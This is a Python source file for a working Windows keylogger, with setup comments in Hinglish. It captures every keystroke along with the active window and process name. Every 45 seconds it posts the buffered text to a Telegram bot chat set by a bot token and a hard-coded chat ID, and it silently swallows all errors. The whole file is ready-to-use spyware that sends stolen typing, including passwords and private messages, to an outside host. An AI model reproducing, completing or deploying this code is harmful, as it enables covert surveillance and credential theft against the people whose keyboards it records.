import time
import threading
import requests
import os
from datetime import datetime
from pynput import keyboard
import win32gui
import win32process
import psutil

# ============= CONFIG =============
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"   # ← Yahan apna bot token daal
TELEGRAM_CHAT_ID = "-1004320842899"           # ← Yahan apna chat id (hyphen ke saath)
SEND_INTERVAL = 45                            # seconds mein buffer bhejega (45 recommended)
# =================================

log_buffer = ""
last_window = ""
running = True

def get_active_window_title():
    try:
        hwnd = win32gui.GetForegroundWindow()
        if hwnd:
            title = win32gui.GetWindowText(hwnd)
            try:
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                proc = psutil.Process(pid)
                app = proc.name()
                return f"{app} - {title}"
            except:
                return title
    except:
        pass
    return "Unknown"

def send_to_telegram(message):
    if not message.strip():
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, data=data, timeout=10)
    except:
        pass

def flush_buffer():
    global log_buffer
    while running:
        time.sleep(SEND_INTERVAL)
        if log_buffer.strip():
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            header = f"🕒 <b>{timestamp}</b>\n📱 <b>Window:</b> {last_window or 'N/A'}\n\n"
            send_to_telegram(header + log_buffer)
            log_buffer = ""

def on_press(key):
    global log_buffer, last_window
    try:
        current_window = get_active_window_title()
        if current_window != last_window and current_window != "Unknown":
            last_window = current_window
            log_buffer += f"\n[Window Changed → {current_window}]\n"
        
        if hasattr(key, 'char') and key.char is not None:
            log_buffer += key.char
        else:
            key_name = str(key).replace("Key.", "").upper()
            if key_name == "SPACE":
                log_buffer += " "
            elif key_name == "ENTER":
                log_buffer += " [ENTER]\n"
            elif key_name == "BACKSPACE":
                log_buffer += " [←]"
            elif key_name in ["CTRL_L", "CTRL_R", "ALT_L", "ALT_R", "SHIFT", "TAB"]:
                log_buffer += f" [{key_name}]"
            else:
                log_buffer += f" [{key_name}]"
    except:
        log_buffer += " [?]"

def on_release(key):
    if key == keyboard.Key.esc:
        global running
        running = False
        return False

def main():
    print("Keylogger started... (Esc to stop for testing)")
    
    sender_thread = threading.Thread(target=flush_buffer, daemon=True)
    sender_thread.start()
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    try:
        main()
    except:
        pass
